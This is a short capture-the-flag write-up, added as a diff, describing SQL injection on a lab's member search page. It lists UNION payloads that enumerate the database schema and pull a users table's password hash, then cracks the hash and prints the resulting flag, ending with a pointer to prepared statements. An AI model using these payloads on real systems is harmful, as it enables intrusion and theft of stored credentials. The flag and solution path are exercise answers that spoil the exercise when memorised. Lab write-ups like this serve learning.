@@ -1,0 +1,33 @@
+SQL Injection are executed on search member page
+
+# Test sql injection
+5 UNION SELECT NULL, NULL
+
+# Get All Tables
+5 UNION ALL SELECT TABLE_SCHEMA,NULL FROM information_schema.tables
+
+# Get All Columns
+5 UNION	ALL SELECT COLUMN_NAME,TABLE_SCHEMA FROM information_schema.columns
+
+# Get Flag from Member_Sql_Injection
+5 UNION ALL SELECT countersign,Commentaire FROM Member_Sql_Injection.users
+
+
+ID: 5 UNION ALL SELECT countersign,Commentaire FROM Member_Sql_Injection.users 
+Title: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
+Url : 5ff9d0165b4f92b14994e5c685cdce28
+
+5ff9d0165b4f92b14994e5c685cdce28 
+Seem to be a MD5 hash
+
+Result decrypted : FortyTwo
+
+Then encrypt 'fortytwo' in sh256 
+
+# flag :
+10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
+
+# BONUS :
+# Prepare statements and parameterize queries
+
+https://www.w3schools.com/php/php_mysql_prepared_statements.asp
